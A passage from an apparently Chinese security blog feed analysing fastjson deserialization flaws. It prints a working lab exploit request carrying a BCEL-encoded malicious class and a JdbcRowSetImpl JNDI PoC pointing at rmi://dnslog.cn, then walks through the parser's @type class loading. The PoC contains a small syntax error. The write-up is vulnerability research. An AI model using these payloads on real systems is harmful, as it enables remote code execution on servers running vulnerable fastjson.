class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/SecForJSP/Sec06/fastjson</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8091</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Token</span><span class="punctuation">: </span>ifconfig</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>5945</span><br><span class="line"></span><br><span class="line">&#123;&#123;</span><br><span class="line">        &quot;x&quot;:&#123;</span><br><span class="line">                &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,                </span><br><span class="line">&quot;driverClassLoader&quot;: &#123;</span><br><span class="line">                    &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;                </span><br><span class="line">&#125;,</span><br><span class="line">                &quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dW$L$7c$Tw$j$ff$fe$ef$92$dc$r$bd6m$a0$c0$c1$c6k$z$b4$40$h$40$c6F$K$MZ$60$U$K$DZ$c1$AS$af$d7ks$90$de$95$cb$85$c7$98o$94$cd$b7$d39$87$ba$v$3e$aa$d3$89$cc$99$f2$Q$c6$9c07q$be$a6$d3Mq8$ls$f3$81s$3a$G$8c$fa$fb$df$b5$r$z$d90$9f$e4$ff$f8$bd$dfwy$fc$e2$a1$a3$Af$e2$7c$Ec$f1$ce$I$de$85w$f3$e5$3d$fc$fa$5e$Zv$EW$e1$7d$R$ec$c2$fb$f9$f2$B$J$5d$i$bd$5b$c6m$RL$c0$ed2$3e$u$e3C2$3e$y$e1$p2$3e$w$e3c$S$3e$cey$3e$n$e3$O$Z$86$84O$Wa$q$3e$c5$97$3bel$94$f1i$Jwq$82$cfH$b8$3b$82$3d$f8$ac$8c$cfI$f8$bc$8c$7b$b8$c0$7be$7c$n$8cI$f8$a2$84$bd$R$da$bf$q$e3$cb$R$7c$F_$e5$c8n$Z_$93$f1u$Z$f7$c9$f8$86$8coJ$b8_$c2$b7$o$98$81$7d$7c$f9v$E$fb$f1$40$E$d3$f1$j$Z$P$f2$fd$bb$7c$c9q$d6$k$Z$H$b8$d6$832$OIH$f2$e3a$Z$df$93pD$c6Q$7e$7bH$c61$J$P$H$e1$7d$8a$Op$_$bf$_$e1$R$86$d0$5c$d32$dd$f9$MbU$f5Z$86$40$83$ddf0D$9bL$cbX$99$edl5$9c$W$ad5M$90X$93$adk$e9$b5$9ac$f2$7b$l0$e0$a6$cc$MCyS$sk$c5$3b$cd$8c$k_$96$b1$adU$9a$931$W$d71$c8s$f5t$9ftF$d4$e3$9b6i$5b$b5xZ$b3$3a$e2$x$ed$e6$ac$9eZb$g$e9$b6$c5$dbu$a3$cb5m$8b8D$3dM$f2$ca$f2$I$h$d2Z$sC$98$J$971$af0$dc$94$3d$88$3b$a0w$b6$R$fb$b0$Ny$b4$cd$aecZ$j$84$M9F$s$9bv$Z$84$N$f5$M$e1$$$c7$d6$8dL$c6v$b8k$97$c8oj$ddd$e8$$$b7$c41$b6$90Db$ea$o$eb7$d1$af$91$7e$ee$60$ea$96$94chm$9c$3a$e3$O$R4$a0W$b4$5b$89$3b2$a0$8f$M$y$f5$e9$b2$ae$99$8e7$99$Z$ae$ae$3c$8f5$df$rf$92$R$edi$ad$83$8e$eb$Z$82$j$8e$9d$r$83F$5ef$c4$8d$i$c1$Z$da$Z$d4$3c$acc$b4$a7$c9$a3$b8$Xj$c2K$aeG$3e4L$D$9e$U7$bb$9a$bey$85$d6$e5$a5X$c2$P$q$i$97p$82j$98$w$9a$aa$9fJ$5e$c2$3a$aa$y$w$tr$ab$d9$ce$3a$ba$b1$c4$e4$d5$Q$bd$94$fcZ$$YA$p$96$R$af$82G$f1C$F$8f$e1q$F$3f$c2I$F$3f$c6$T$qU$c1O$f0S$F$3f$c3$cf$V$fc$CO$92$9f$c6vCW$f0K$fc$8a$ce$v$d7$r$3f$8b$ea$d3$b6$bey$95$9dN$h$U$df$90$ab9$j$G$cf$c1$r$c3$d7d$z$cb$_$c6$Q$_$c6$8a$e9$e4bJ$b3$da$3c$86$b1o$5cp$K$9e$c2Ib$ecH$db$adZ$9a$a1dpZ$U$fc$g$bf$e1$G$3eM$86$90$de5T$L$b6$95$e1$9e$O$a9O$F$cf$e0$b7$94$d7$a1u$q$e1w$KN$e1$f7To$c4$bf$94$o$cc$ad$w$jZ$r$94$d7$W$7b$b3A$f6$3c$8b$d3D$9b1$5c$ca$82$9b$r$b9$7f$40$L$f5$c3$r$86F$cb5$3a$M$87$87$f69$f2$d4$ce$d4ZZ$t$a5$e9$8f$K$fe$84$3f$x$f8$L$Pdh$9bi$b5$d9$db$IO$NQKQ$a5$a2$8f$ebt$8d$b7$9aV$3c$93$a2k$8d$de$_$d6s$b7Y$d7$y$8b$db6$ea$92$aaU$7e$c5$d6g$cdt$9b$af$f1y$F$7f$c5$L$S$5eT$f07$fc$9dC$feA$a26$$T$f0O$9cQ$f0$_$3c$a9$e0$r$fc$9bJ$8bK$a9$b5L$bb$b6$7e$87k$d4g$db$db$b9$80$97$f1$lJ$ec6G$ebR$f0_$k$_$a9$cd$5e$e7$98$$$997$ee$K$cd$cdPa$3b$j$b5Z$97$a6$a7$8cZ$d7$ee$d45$b7$96$5b$5e$db$9am$f7$944$a4$b2$d6f$F$af$e0$y$cd$j$K$m$87e$fa$y$Z$d2V$K$5e$c59B$V$YZ$d4$88$F$h$8b$3a$eeuZjP$3a$7d$Oj$o$3d$eb8$86$e5$f6$df$87WU$X$ea$b5$S$w$8aAJ$d4$Ct$fd$8d$z$T$b1Wld$f9$m$b2$fe$JYJ$E$8b$M$3d$ad9F$5b$9fi5U$97O$a4$ea7$Y$O$c5$U$b8$85$3a$cf$ba$e9$cf$f7$aa$f5$fc$a1$mzM7$a9$ea$f29Y$5dhtJD$be$92$aar$a8$df$D$pQ$d6m$cb$d5L$8b$5c$Z$93$_$b4$n$a59$cd$c6$96$aca$e9F$5d5$8d$bbb$92$d4$9c$ed2$i$ddw$3c$901o1$bcG$V$N$e3$f2$aa$c6$82$eay$ab$f9$e5$c3$b0$a0$40$A6$5c$W$bbB$n$f1$r$d4$N$ea$88$c18$ea3$d3$daJ$7d$cb0$a7$40h6$fc$bf$d123$8b$3b$bb$dc$j$9e$5b$e4s$a0$r$b9j1$P$7d$p$P$7d$fe$ac$d8$91q$8dN$7f$UQoRT8$d3$a4$x$a4x$m$e8E$ae$dddo3$9c$G$8dO$b0$RU$F$k$92$5ca0CC$d6$e5$d1$cd$97$d27$L$ea$G$cd$a2$3e$a0_$c7$8dVW$96$a6$WU$y$998$b2$9f$d9$b4$e3y$I$k$cd$aa$82$I$aeY$c9f$8cEF$da$ec$a4$89$40$93h$f2$eb$3b$96$3f$b2$f8c$df2$b6$bb$7e$83$f4u$7d$a0$aa$9a$3f$e4$a5v$db$f1$L$b1$f2$KQ$ea$ef$a1$b2$bc$k$ea$cfr$91elk$b4$u$yT$95CKz$m$8b$c1L$da0$ba$b8$e6e$d5k$e9$8dl$v$bd$60$f2$8f$A$c6$9f$82$b4$$$a7$5b$9cvF$7bpJ$P$d8$7e$P$ddDk$c8$D$KXA$ab$e2$T$60$rn$a2$5d$c6$aa$7e$e6$90J$b72$40$i$$$d6$j$80$90$83$d845$87$40$y$98Ch$c5$b4$40$O$d24$ba$cb$c7$Q$a6$efJqv$a0$3cPst$af$f0tMy$60f$o$a8$G$lE$a8$5b8$a1$Sy$q$RRC$b1$a2$i$94$3d$YI$a7b$3a$dd$8db$3a$95x$t$a2$bb$87$d3$Fb$d1K$b29$40NH$aa$f40J$f7p$92$9d$aa$c4I$ca$f2H$a4$3e$S$O$8fqx7F$qd$ef$9e$c3p$fa$fa$d0$cb$a99$aa$dcg$u$edc$f0$ef$F$E$8f$Y$C$3f$86$91$f4M$c8$e2$ecpyX$95$Pb$U$c3$5e$f6$84$w$97$87$PB$V$90$88$a8$R$ce7$3a$8f$_$c2$e5$V$a9E$i$3eF$3c$82$abr$b8Z$z$a2$c3$d8$i$c6$r$U$l1$3e$40$88$a48$M$T$9a$3d4$5d$c7$s$c5$d8D$ba$8d$3b$86$J$3c$88$tXR$N$e5p$cd$k$b6ZU8O$85$cf$f3$A$w$3d$k$c5$e79$8cI$c92$3c$d6$83$c9$9cw$5d$ac$ea$A$aas$98$S$9b$ea$85$5b$N$j$c1$E$S$3c$ad9$Z$88$d54$t$83j$a8$99$C$d7$H$ad$e5$d0$b8$PM$U$l$c6$f4$e4a$ccH$aa$c5$3d$98$99$c3$9br$98$d5$83kc$b3s$b8$$$87$ebs$98$93$u$89$r$O$a0$$$RU$a3$b1$b9$fd$O$cc$p$b5$f3$d5$a8o$8cZ$c2$8d$a0hz$G$df$e0$d3$a8$d1$7c$7bU$c9$b3$b3$h$3b$S$d1$d8B$$$aeT$z$cd$a1$9e$98Jc$N$a1$B$a9$c9$Aw4$Z$f4$dd$9d$afJ$a1$7e$N$c9$A$f7Y$e4$k$t$83$fc$a8$96$i$edw$7f$b0$e2$d2$C$8a$Du$a3y$V$o$bc$x$cc$ba$_N$f3$_e$dd$94$b3$607$c4$5d$B$d6$fdZe7J$96$P$c7$e2$D$b8$b1$h$81$a6$fd$I$e3$5e$dc$87$fb1$8c$de$$$9f$a1w$aea$c2X$n$rl$c6$C$d4b$8ep$O$8b0$X$9a$b7$b7a$97$b7$ef$W$5e$f6v$88AQ$c6$o1$yF$c5$Y$ddE$de$93$y$82z$af$P$F$ea$ce0$q$92$xc$U$9d$w$Q$n$89$Kf$a1$98$q$96$a0$BQ$92X$K$9bz$d3E$M$b7$S$e5n$M$c7$j$u$c7$5d$YAV$8d$o$bb$c6$90e$w$f6a4$8e$d1$bf$b1$e3$b8$9a$ac$iGvN$qK$c7$d3$5b$df$E$bc$88kp$86$a4$9fE$r$T1$89$c9$98$ccF$a0$8aU$a2$9aM$c7$UV$87$a9l$B$a6$b1$a5$a8a$gj$d9m$88$b3$3b1$9d$j$c3$Mv$k3$85$b1$98$rT$e2Za$Jf$L$v$cc$r$cf$af$T$3aq$bd$e0$92$f7$3b$91$Q$kB$9dp$g$f3$84$e7p$83$f0$C$aa$843X$u$bc$82E$U$81z$e1$C$g$84$5eD$c4$m$96S$q$96$88a$y$V$a3XF$d1h$a4$3c7ys$e9$U$f9$b2$8f$7c$5c$8d5$U$89gQ$e4$9fHg$D$9a$d1$82$ui$ea$f4N$a5$a4$d7$r$ec$9b$R$r$cb$9e$c7Z$acC1$d9w$ioA$S$rl$3a$3b$84$f5$d8$80$I$5b$ca$f6b$p$9d$8a$98$c6n$c7$cdtR$98$ca$9e$c2$5b$f16$8a$f4$y$e1$R$bc$j$g$e5$a0Ax$Q$ad$d0$v$T$b7$92$_mD$t$b1$R$ec4$M$b4$93$F$X$uc$ab$d1At$93$85SH$Ro$A$82$u$c2$c4$s$b2$3bL$f8$cdH$d3$M$j$s$bcD$WZ$94$d1$K$8a$84$8d$$$88$e4i$c4$e3$F$b6$d0$af$H$a3z1$ZA$s$c1$91$90$91$Q$a6Y$7c$B$c3$r$b8$XP$n$nK$b2$sJ$d8J$ef$db$dbb7$d3$a2$bc$86$g$J$db$d9E$9c$q$b0$ff$5d$paG$_$89$8b$e6I$n$B$c4$ed$e1$b7$b3$BJ$o$940$P$E$b8$e5$3c$b2$af$82$9dE$e8$i$82$bd$e4$e7$60$T$ea$r$ec$M$f4$c2$fb$f7$ce$cf$bd$U$j$o$d8$e9$z$e7$I$c8$a8$ec$f8$D$e4$j$ff$D$bd$d5$$$c0$f1$Q$A$A&quot;        &#125;</span><br><span class="line">    &#125;: &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666865887150-1c172434-43c4-4dfd-90d8-d7fe1cedb96b.png#averageHue=%23f5f5f5&clientId=u95dfbd9d-d538-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=416&id=u12ae7457&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1168&originWidth=2716&originalType=binary&ratio=1&rotation=0&showTitle=false&size=604694&status=done&style=none&taskId=u045de62d-97f6-4f55-a27e-41c4fc9930c&title=&width=968" alt="image.png"></p><h5 id="2-3-4-4-内存马"><a href="#2-3-4-4-内存马" class="headerlink" title="2.3.4.4 内存马"></a>2.3.4.4 内存马</h5><p>还未构造，和<code>Tomcat</code>一样</p><h3 id="2-4-JdbcRowSetImpl利用链"><a href="#2-4-JdbcRowSetImpl利用链" class="headerlink" title="2.4 JdbcRowSetImpl利用链"></a>2.4 JdbcRowSetImpl利用链</h3><h4 id="2-4-1-JNDI调用"><a href="#2-4-1-JNDI调用" class="headerlink" title="2.4.1 JNDI调用"></a>2.4.1 JNDI调用</h4><p>如图<code>JdbcRowSetImpl#connect</code>中触发<code>JNDI</code>请求，<code>dataSourceName</code>是参数<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666882706442-4eb44d94-e709-4558-8e10-f923f8b16e71.png#averageHue=%23f7f4ee&clientId=u13878d85-faf4-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=390&id=uc2319c10&margin=%5Bobject%20Object%5D&name=image.png&originHeight=924&originWidth=2358&originalType=binary&ratio=1&rotation=0&showTitle=false&size=252333&status=done&style=none&taskId=uc00169fd-0d02-40d2-9248-6a9010e6f23&title=&width=996" alt="image.png"></p><h4 id="2-4-2-触发链setAutoCommit"><a href="#2-4-2-触发链setAutoCommit" class="headerlink" title="2.4.2 触发链setAutoCommit"></a>2.4.2 触发链setAutoCommit</h4><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666882878566-cc3bd17a-c6a2-4454-8c17-51837fc0986a.png#averageHue=%23f7f5ee&clientId=u13878d85-faf4-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=337&id=u36fa8156&margin=%5Bobject%20Object%5D&name=image.png&originHeight=674&originWidth=1432&originalType=binary&ratio=1&rotation=0&showTitle=false&size=133052&status=done&style=none&taskId=ud0ac60d4-911a-4309-817f-d72274c4d0a&title=&width=716" alt="image.png"></p><h4 id="2-4-3-Poc"><a href="#2-4-3-Poc" class="headerlink" title="2.4.3 Poc"></a>2.4.3 Poc</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span>: <span class="string">&quot;rmi://dnslog.cn&quot;</span>,</span><br><span class="line">    &quot;autoCommit&quot; true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 攻防研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
            <tag> fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastjson序列化和反序列化</title>
      <link href="/2022/11/11/fastjson%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2022/11/11/fastjson%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="1-对象和Json字符串之间的转换"><a href="#1-对象和Json字符串之间的转换" class="headerlink" title="1. 对象和Json字符串之间的转换"></a>1. 对象和Json字符串之间的转换</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> example;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">doJson</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> String <span class="title">Object2Json</span><span class="params">(Object obj, SerializerFeature serializerFeature)</span></span>&#123;</span><br><span class="line">        String jsonStr = JSON.toJSONString(obj, serializerFeature);</span><br><span class="line">        <span class="keyword">return</span> jsonStr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> Object <span class="title">Json2Object</span><span class="params">(String jsonStr)</span></span>&#123;</span><br><span class="line">        Object o = JSON.parse(jsonStr);</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        String str = Object2Json(user, SerializerFeature.WriteNullNumberAsZero);</span><br><span class="line">        System.out.println(<span class="string">&quot;User对象没有赋值转换为Json字符串：&quot;</span>);</span><br><span class="line">        System.out.println(str);</span><br><span class="line">        System.out.println(JSON.toJSONString(user));</span><br><span class="line">        user.setName(<span class="string">&quot;Lion&quot;</span>);</span><br><span class="line">        user.setAge(<span class="number">18</span>);</span><br><span class="line">        user.setSchool(<span class="string">&quot;qinghua&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;User对象字段赋值后转换为Json字符串：&quot;</span>);</span><br><span class="line">        System.out.println(Object2Json(user, SerializerFeature.WriteNullNumberAsZero));</span><br><span class="line">        System.out.println(<span class="string">&quot;指定类后转换为Json字符串&quot;</span>);</span><br><span class="line">        System.out.println(Object2Json(user, SerializerFeature.WriteClassName));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/img/fastjson序列化和反序列化/1.png" alt="1" style="zoom:50%;" /><img src="/img/fastjson序列化和反序列化/2.png" alt="2" style="zoom:50%;" /><h2 id="2-反序列化解析流程"><a href="#2-反序列化解析流程" class="headerlink" title="2. 反序列化解析流程"></a>2. 反序列化解析流程</h2><blockquote><p>这里主要看一下字符串转成Object的解析流程</p></blockquote><h3 id="2-1-创建JSON解析器"><a href="#2-1-创建JSON解析器" class="headerlink" title="2.1 创建JSON解析器"></a>2.1 创建JSON解析器</h3><p>com.alibaba.fastjson.parse</p><ol><li>创建默认的JSON解析器，默认的全局配置中有DenyList，1.2.24版本上只有两个Thread类</li></ol><img src="/img/fastjson序列化和反序列化/3.png" alt="3" style="zoom:50%;" /><ol start="2"><li>创建新的Json解析器中，跟入<code>new JSONScanner(intput, features)</code></li></ol><img src="/img/fastjson序列化和反序列化/4.png" alt="4" style="zoom:50%;" /><ol start="3"><li>进入<code>JSONScanner</code>的构造方法，这里去了字符串的第一个字符，如<code>&#123;</code>，判断了是否为<code>\ufeff</code>（Byte Order Mark，字节顺序标记，出现在文本文件头部，Unicode编码标准中用于标识文件是采用哪种格式的编码）</li></ol><img src="/img/fastjson序列化和反序列化/5.png" alt="5" style="zoom:50%;" /><ol start="4"><li>进入<code>DefaultJSONParser</code>构造方法</li></ol><p>可以看到判断第一个字符是否为<code>&#123;</code>如果是则取下一个字符，下面有个判断是否为<code>[</code>的，这个可以留着再分析 ，此时的token被指定为12</p><div align=center><img src="/img/fastjson序列化和反序列化/6.png" alt="6" style="zoom:50%;" /></div><h3 id="2-2-解析器工作"><a href="#2-2-解析器工作" class="headerlink" title="2.2 解析器工作"></a>2.2 解析器工作</h3><ul><li>parse.parse()解析</li></ul><p>回到步骤1，进入<code>parse.parse();</code>首先判断Token是否正常，<code>1,5,10,11,13,15,16,17,18,19</code>都会抛出异常，这里感觉有很多的case分支，不知道的干什么的，也可以留下来</p><div align=center><img src="/img/fastjson序列化和反序列化/7.png" alt="7" style="zoom:50%;" /></div><div align=center><img src="/img/fastjson序列化和反序列化/8.png" alt="7" style="zoom:50%;" /></div><ol start="6"><li>进入<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject</code></li></ol><div align=center><img src="/img/fastjson序列化和反序列化/9.png" alt="9" style="zoom:50%;" /></div><p>第一步跳过空白字符，跟入方法看见 首先判断ch是否<code>&lt;=&#39;/&#39;</code>，然后<code> </code>、<code>\r</code>、<code>\n</code>、<code>\t</code>、<code>\f</code>、<code>\b</code>，如果等于<code>/</code>；循环判断是否为<code>/</code>、<code>*</code>、<code>\n</code></p><div align=center><img src="/img/fastjson序列化和反序列化/10.png" alt="10" style="zoom:50%;" /></div>如图会取Key值，即`""`中的字符，如`@type`<div align=center><img src="/img/fastjson序列化和反序列化/10.png" alt="10" style="zoom:50%;" /></div>继续向下，判断Key是否为@type后，以"为单位获取对应的`Class`，ClassLoader为`this.config.getDefaultClassLoader`，此时为null<div align=center><img src="/img/fastjson序列化和反序列化/12.png" alt="12" style="zoom:50%;" /></div><h4 id="2-2-1-type类加载"><a href="#2-2-1-type类加载" class="headerlink" title="2.2.1 @type类加载"></a>2.2.1 @type类加载</h4><p>这里首先通过mapping去直接获取Class，如果不是这些开头的key，则继续运行</p><div align=center><img src="/img/fastjson序列化和反序列化/13.png" alt="13" style="zoom:50%;" /></div>如代码分析，有几个判断条件，首先判断第一个字符是否为`[`，其次判断是否为`L`且结束为`;`<ul><li>为<code>[</code>时，通过<code>loadClass</code>加载<code>[</code>后的字符，并返回<code>Array</code>动态数组</li><li><code>L</code>开头时，去中间字符串类名，再次调用<code>loadClass</code>进行加载</li></ul><p>接下来判断ClassLoader是否为空</p><ul><li><p>如果为空则取<code>Thread.currentThread().getContextClassLoader()</code>；</p></li><li><p>如果取<code>Class</code>失败，直接通过<code>Class.forName</code>获取类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">    <span class="keyword">if</span> (className != <span class="keyword">null</span> &amp;&amp; className.length() != <span class="number">0</span>) &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = (Class)mappings.get(className);</span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">            Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">            <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">            String newClassName = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (classLoader != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    clazz = classLoader.loadClass(className);</span><br><span class="line">                    mappings.put(className, clazz);</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var6) &#123;</span><br><span class="line">                var6.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();</span><br><span class="line">                <span class="keyword">if</span> (contextClassLoader != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    clazz = contextClassLoader.loadClass(className);</span><br><span class="line">                    mappings.put(className, clazz);</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var5) &#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                clazz = Class.forName(className);</span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var4) &#123;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-2-2-类加载成功后"><a href="#2-2-2-类加载成功后" class="headerlink" title="2.2.2 类加载成功后"></a>2.2.2 类加载成功后</h4><p>这里会执行<code>nextToken</code>，先看看<code>nextToken</code>是什么，如果<code>token=13</code>，则进入一段执行代码，通过查看<code>nextToken</code>中代码，发现<code>ch=&#125;</code>时会导致<code>token=13</code></p></li><li><p>这里先跳过他，如果是<code>&#125;</code>的话，大概逻辑也就是实例化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (lexer.token() == <span class="number">13</span>) &#123;</span><br><span class="line">    lexer.nextToken(<span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        instance = <span class="keyword">null</span>;</span><br><span class="line">        ObjectDeserializer deserializer = <span class="keyword">this</span>.config.getDeserializer(clazz);</span><br><span class="line">        <span class="keyword">if</span> (deserializer <span class="keyword">instanceof</span> JavaBeanDeserializer) &#123;</span><br><span class="line">            instance = ((JavaBeanDeserializer)deserializer).createInstance(<span class="keyword">this</span>, clazz);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz == Cloneable.class) &#123;</span><br><span class="line">                instance = <span class="keyword">new</span> HashMap();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;java.util.Collections$EmptyMap&quot;</span>.equals(ref)) &#123;</span><br><span class="line">                instance = Collections.emptyMap();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                instance = clazz.newInstance();</span><br><span class="line">            &#125;</span><br><span class="line">        